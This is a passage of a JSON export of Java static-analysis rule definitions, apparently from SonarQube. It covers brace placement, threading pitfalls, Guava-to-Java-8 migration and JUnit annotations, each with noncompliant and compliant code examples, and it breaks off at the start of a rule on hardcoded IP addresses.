            "mdDesc": "<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the\nbeginning of a line.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(condition) {\n  doSomething();}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif(condition) {\n  doSomething();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered. </p>\n<pre>\nif(condition) {doSomething();}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2438",
            "repo": "java",
            "name": "\"Threads\" should not be used where \"Runnables\" are expected",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While it is technically correct to use a <code>Thread</code> where a <code>Runnable</code> is called for, the semantics of the two objects are\ndifferent, and mixing them is a bad practice that will likely lead to headaches in the future.</p>\n<p>The crux of the issue is that <code>Thread</code> is a larger concept than <code>Runnable</code>. A <code>Runnable</code> is an object whose\nrunning should be managed. A <code>Thread</code> expects to manage the running of itself or other <code>Runnables</code>. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\tpublic static void main(String[] args) {\n\t\tThread r =new Thread() {\n\t\t\tint p;\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\twhile(true)\n\t\t\t\t\tSystem.out.println(\"a\");\n\t\t\t}\n\t\t};\n\t\tnew Thread(r).start();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n\tpublic static void main(String[] args) {\n\t\tRunnable r =new Runnable() {\n\t\t\tint p;\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\twhile(true)\n\t\t\t\t\tSystem.out.println(\"a\");\n\t\t\t}\n\t\t};\n\t\tnew Thread(r).start();\n</pre>",
            "mdDesc": "<p>While it is technically correct to use a <code>Thread</code> where a <code>Runnable</code> is called for, the semantics of the two objects are\ndifferent, and mixing them is a bad practice that will likely lead to headaches in the future.</p>\n<p>The crux of the issue is that <code>Thread</code> is a larger concept than <code>Runnable</code>. A <code>Runnable</code> is an object whose\nrunning should be managed. A <code>Thread</code> expects to manage the running of itself or other <code>Runnables</code>. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n\tpublic static void main(String[] args) {\n\t\tThread r =new Thread() {\n\t\t\tint p;\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\twhile(true)\n\t\t\t\t\tSystem.out.println(\"a\");\n\t\t\t}\n\t\t};\n\t\tnew Thread(r).start();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n\tpublic static void main(String[] args) {\n\t\tRunnable r =new Runnable() {\n\t\t\tint p;\n\t\t\t@Override\n\t\t\tpublic void run() {\n\t\t\t\twhile(true)\n\t\t\t\t\tSystem.out.println(\"a\");\n\t\t\t}\n\t\t};\n\t\tnew Thread(r).start();\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "multi-threading",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1108",
            "repo": "java",
            "name": "Close curly brace and the next \"else\", \"catch\" and \"finally\" keywords should be on two different lines",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>\n<p>This rule makes it mandatory to place a closing curly brace and the next <code>else</code>, <code>catch</code> or <code>finally</code> keyword on\ntwo different lines.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {          // Noncompliant\n    doSomethingElse();\n  }\n  else {                               // Compliant\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  }\n  finally {\n    closeConnection();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  }\n  else if (somethingElse) {\n    doSomethingElse();\n  }\n  else {\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  }\n  catch (Exception e) {\n    log(e);\n  }\n  finally {\n    closeConnection();\n  }\n}\n</pre>",
            "mdDesc": "<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>\n<p>This rule makes it mandatory to place a closing curly brace and the next <code>else</code>, <code>catch</code> or <code>finally</code> keyword on\ntwo different lines.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {          // Noncompliant\n    doSomethingElse();\n  }\n  else {                               // Compliant\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  }\n  finally {\n    closeConnection();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  }\n  else if (somethingElse) {\n    doSomethingElse();\n  }\n  else {\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  }\n  catch (Exception e) {\n    log(e);\n  }\n  finally {\n    closeConnection();\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4977",
            "repo": "java",
            "name": "Type parameters should not shadow other type parameters",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shadowing makes it impossible to use the type parameter from the outer scope. Also, it can be confusing to distinguish which type parameter is\nbeing used.</p>\n<p>This rule raises an issue when a type parameter from an inner scope uses the same name as one in an outer scope.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n public class TypeParameterHidesAnotherType&lt;T&gt; {\n\n    public class Inner&lt;T&gt; { // Noncompliant\n      //...\n    }\n\n    private &lt;T&gt; T method() { // Noncompliant\n      return null;\n    }\n\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class NoTypeParameterHiding&lt;T&gt; {\n\n    public class Inner&lt;S&gt; { // Compliant\n      List&lt;S&gt; listOfS;\n    }\n\n    private &lt;V&gt; V method() { // Compliant\n      return null;\n    }\n\n  }\n</pre>",
            "mdDesc": "<p>Shadowing makes it impossible to use the type parameter from the outer scope. Also, it can be confusing to distinguish which type parameter is\nbeing used.</p>\n<p>This rule raises an issue when a type parameter from an inner scope uses the same name as one in an outer scope.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n public class TypeParameterHidesAnotherType&lt;T&gt; {\n\n    public class Inner&lt;T&gt; { // Noncompliant\n      //...\n    }\n\n    private &lt;T&gt; T method() { // Noncompliant\n      return null;\n    }\n\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class NoTypeParameterHiding&lt;T&gt; {\n\n    public class Inner&lt;S&gt; { // Compliant\n      List&lt;S&gt; listOfS;\n    }\n\n    private &lt;V&gt; V method() { // Compliant\n      return null;\n    }\n\n  }\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1107",
            "repo": "java",
            "name": "Close curly brace and the next \"else\", \"catch\" and \"finally\" keywords should be located on the same line",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>\n<p>This rule makes it mandatory to place closing curly braces on the same line as the next <code>else</code>, <code>catch</code> or\n<code>finally</code> keywords.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {\n    doSomethingElse();\n  }\n  else {                               // Noncompliant\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  }\n  finally {                            // Noncompliant\n    closeConnection();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {\n    doSomethingElse();\n  } else {\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  } finally {\n    closeConnection();\n  }\n}\n</pre>",
            "mdDesc": "<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>\n<p>This rule makes it mandatory to place closing curly braces on the same line as the next <code>else</code>, <code>catch</code> or\n<code>finally</code> keywords.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {\n    doSomethingElse();\n  }\n  else {                               // Noncompliant\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  }\n  finally {                            // Noncompliant\n    closeConnection();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {\n    doSomethingElse();\n  } else {\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  } finally {\n    closeConnection();\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1228",
            "repo": "java",
            "name": "Packages should have a javadoc file 'package-info.java'",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Each package in a Java project should include a <code>package-info.java</code> file. The purpose of this file is to document the Java package using\njavadoc and declare package annotations.</p>\n<h2>Compliant Solution</h2>\n<pre>\n/**\n* This package has non null parameters and is documented.\n**/\n@ParametersAreNonnullByDefault\npackage org.foo.bar;\n</pre>",
            "mdDesc": "<p>Each package in a Java project should include a <code>package-info.java</code> file. The purpose of this file is to document the Java package using\njavadoc and declare package annotations.</p>\n<h2>Compliant Solution</h2>\n<pre>\n/**\n* This package has non null parameters and is documented.\n**/\n@ParametersAreNonnullByDefault\npackage org.foo.bar;\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1106",
            "repo": "java",
            "name": "An open curly brace should be located at the beginning of a line",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning\nof a line.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod {  // Noncompliant\n  if(something) {  // Noncompliant\n    executeTask();\n  } else {  // Noncompliant\n    doSomethingElse();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void myMethod\n{\n  if(something)\n  {\n    executeTask();\n  } else\n  {\n    doSomethingElse();\n  }\n}\n</pre>",
            "mdDesc": "<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning\nof a line.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod {  // Noncompliant\n  if(something) {  // Noncompliant\n    executeTask();\n  } else {  // Noncompliant\n    doSomethingElse();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void myMethod\n{\n  if(something)\n  {\n    executeTask();\n  } else\n  {\n    doSomethingElse();\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4738",
            "repo": "java",
            "name": "Java 8 features should be preferred to Guava",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Some Guava features were really useful for Java 7 application because Guava was bringing APIs missing in the JDK. Java 8 fixed these limitations.\nWhen migrating an application to Java 8 or even when starting a new one, it's recommended to prefer Java 8 APIs over Guava ones to ease its\nmaintenance: developers don't need to learn how to use two APIs and can stick to the standard one.</p>\n<p>This rule raises an issue when the following Guava APIs are used:</p>\n<table>\n  <tbody>\n    <tr>\n      <th> Guava API </th>\n      <th> Java 8 API </th>\n    </tr>\n    <tr>\n      <td> com.google.common.io.BaseEncoding#base64() </td>\n      <td> java.util.Base64 </td>\n    </tr>\n    <tr>\n      <td> com.google.common.io.BaseEncoding#base64Url() </td>\n      <td> java.util.Base64 </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Joiner.on() </td>\n      <td> java.lang.String#join() or java.util.stream.Collectors#joining() </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Optional#of() </td>\n      <td> java.util.Optional#of() </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Optional#absent() </td>\n      <td> java.util.Optional#empty() </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Optional#fromNullable() </td>\n      <td> java.util.Optional#ofNullable() </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Optional </td>\n      <td> java.util.Optional </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Predicate </td>\n      <td> java.util.function.Predicate </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Function </td>\n      <td> java.util.function.Function </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Supplier </td>\n      <td> java.util.function.Supplier </td>\n    </tr>\n  </tbody>\n</table>",
            "mdDesc": "<p>Some Guava features were really useful for Java 7 application because Guava was bringing APIs missing in the JDK. Java 8 fixed these limitations.\nWhen migrating an application to Java 8 or even when starting a new one, it's recommended to prefer Java 8 APIs over Guava ones to ease its\nmaintenance: developers don't need to learn how to use two APIs and can stick to the standard one.</p>\n<p>This rule raises an issue when the following Guava APIs are used:</p>\n<table>\n  <tbody>\n    <tr>\n      <th> Guava API </th>\n      <th> Java 8 API </th>\n    </tr>\n    <tr>\n      <td> com.google.common.io.BaseEncoding#base64() </td>\n      <td> java.util.Base64 </td>\n    </tr>\n    <tr>\n      <td> com.google.common.io.BaseEncoding#base64Url() </td>\n      <td> java.util.Base64 </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Joiner.on() </td>\n      <td> java.lang.String#join() or java.util.stream.Collectors#joining() </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Optional#of() </td>\n      <td> java.util.Optional#of() </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Optional#absent() </td>\n      <td> java.util.Optional#empty() </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Optional#fromNullable() </td>\n      <td> java.util.Optional#ofNullable() </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Optional </td>\n      <td> java.util.Optional </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Predicate </td>\n      <td> java.util.function.Predicate </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Function </td>\n      <td> java.util.function.Function </td>\n    </tr>\n    <tr>\n      <td> com.google.common.base.Supplier </td>\n      <td> java.util.function.Supplier </td>\n    </tr>\n  </tbody>\n</table>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "guava",
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2437",
            "repo": "java",
            "name": "Silly bit operations should not be performed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Certain bit operations are just silly and should not be performed because their results are predictable.</p>\n<p>Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will <code>anyValue ^ 0</code> and\n<code>anyValue | 0</code>.</p>",
            "mdDesc": "<p>Certain bit operations are just silly and should not be performed because their results are predictable.</p>\n<p>Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will <code>anyValue ^ 0</code> and\n<code>anyValue | 0</code>.</p>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5826",
            "repo": "java",
            "name": "Methods setUp() and tearDown() should be correctly annotated starting with JUnit4",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The <code>setUp()</code> and <code>tearDown()</code> methods (initially introduced with JUnit3 to execute a block of code before and after each\ntest) need to be correctly annotated with the equivalent annotation in order to preserve the same behavior when migrating from JUnit3 to JUnit4 or\nJUnit5.</p>\n<p>This rule consequently raise issues on <code>setUp()</code> and <code>tearDown()</code> methods which are not annotated in test classes.</p>\n<h2>Noncompliant Code Example</h2>\n<ul>\n  <li> JUnit4: </li>\n</ul>\n<pre>\npublic void setUp() { ... } // Noncompliant; should be annotated with @Before\npublic void tearDown() { ... }  // Noncompliant; should be annotated with @After\n</pre>\n<ul>\n  <li> JUnit5: </li>\n</ul>\n<pre>\npublic void setUp() { ... } // Noncompliant; should be annotated with @BeforeEach\npublic void tearDown() { ... }  // Noncompliant; should be annotated with @AfterEach\n</pre>\n<h2>Compliant Solution</h2>\n<ul>\n  <li> JUnit4: </li>\n</ul>\n<pre>\n@Before\npublic void setUp() { ... }\n\n@After\npublic void tearDown() { ... }\n</pre>\n<ul>\n  <li> JUnit5: </li>\n</ul>\n<pre>\n@BeforeEach\nvoid setUp() { ... }\n\n@AfterEach\nvoid tearDown() { ... }\n</pre>",
            "mdDesc": "<p>The <code>setUp()</code> and <code>tearDown()</code> methods (initially introduced with JUnit3 to execute a block of code before and after each\ntest) need to be correctly annotated with the equivalent annotation in order to preserve the same behavior when migrating from JUnit3 to JUnit4 or\nJUnit5.</p>\n<p>This rule consequently raise issues on <code>setUp()</code> and <code>tearDown()</code> methods which are not annotated in test classes.</p>\n<h2>Noncompliant Code Example</h2>\n<ul>\n  <li> JUnit4: </li>\n</ul>\n<pre>\npublic void setUp() { ... } // Noncompliant; should be annotated with @Before\npublic void tearDown() { ... }  // Noncompliant; should be annotated with @After\n</pre>\n<ul>\n  <li> JUnit5: </li>\n</ul>\n<pre>\npublic void setUp() { ... } // Noncompliant; should be annotated with @BeforeEach\npublic void tearDown() { ... }  // Noncompliant; should be annotated with @AfterEach\n</pre>\n<h2>Compliant Solution</h2>\n<ul>\n  <li> JUnit4: </li>\n</ul>\n<pre>\n@Before\npublic void setUp() { ... }\n\n@After\npublic void tearDown() { ... }\n</pre>\n<ul>\n  <li> JUnit5: </li>\n</ul>\n<pre>\n@BeforeEach\nvoid setUp() { ... }\n\n@AfterEach\nvoid tearDown() { ... }\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1105",
            "repo": "java",
            "name": "An open curly brace should be located at the end of a line",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a\nline of code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(condition)\n{\n  doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif(condition) {\n  doSomething();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>\n<pre>\nif(condition) {doSomething();}\n</pre>",
            "mdDesc": "<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a\nline of code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(condition)\n{\n  doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif(condition) {\n  doSomething();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>\n<pre>\nif(condition) {doSomething();}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "1min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "1min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "1min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "1min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1226",
            "repo": "java",
            "name": "Method parameters, caught exceptions and foreach variables' initial values should not be ignored",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.\nInstead, initial values of parameters, caught exceptions, and foreach parameters should be, if not treated as <code>final</code>, then at least read\nbefore reassignment.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doTheThing(String str, int i, List&lt;String&gt; strings) {\n  str = Integer.toString(i); // Noncompliant\n\n  for (String s : strings) {\n    s = \"hello world\"; // Noncompliant\n  }\n}\n</pre>",
            "mdDesc": "<p>While it is technically correct to assign to parameters from within method bodies, doing so before the parameter value is read is likely a bug.\nInstead, initial values of parameters, caught exceptions, and foreach parameters should be, if not treated as <code>final</code>, then at least read\nbefore reassignment.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doTheThing(String str, int i, List&lt;String&gt; strings) {\n  str = Integer.toString(i); // Noncompliant\n\n  for (String s : strings) {\n    s = \"hello world\"; // Noncompliant\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2885",
            "repo": "java",
            "name": "Non-thread-safe fields should not be static",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Not all classes in the standard Java library were written to be thread-safe. Using them in a multi-threaded manner is highly likely to cause data\nproblems or exceptions at runtime.</p>\n<p>This rule raises an issue when an instance of <code>Calendar</code>, <code>DateFormat</code>, <code>javax.xml.xpath.XPath</code>, or\n<code>javax.xml.validation.SchemaFactory</code> is marked <code>static</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  private static SimpleDateFormat format = new SimpleDateFormat(\"HH-mm-ss\");  // Noncompliant\n  private static Calendar calendar = Calendar.getInstance();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  private SimpleDateFormat format = new SimpleDateFormat(\"HH-mm-ss\");\n  private Calendar calendar = Calendar.getInstance();\n</pre>",
            "mdDesc": "<p>Not all classes in the standard Java library were written to be thread-safe. Using them in a multi-threaded manner is highly likely to cause data\nproblems or exceptions at runtime.</p>\n<p>This rule raises an issue when an instance of <code>Calendar</code>, <code>DateFormat</code>, <code>javax.xml.xpath.XPath</code>, or\n<code>javax.xml.validation.SchemaFactory</code> is marked <code>static</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  private static SimpleDateFormat format = new SimpleDateFormat(\"HH-mm-ss\");  // Noncompliant\n  private static Calendar calendar = Calendar.getInstance();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  private SimpleDateFormat format = new SimpleDateFormat(\"HH-mm-ss\");\n  private Calendar calendar = Calendar.getInstance();\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1313",
            "repo": "java",
            "name": "Using hardcoded IP addresses is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
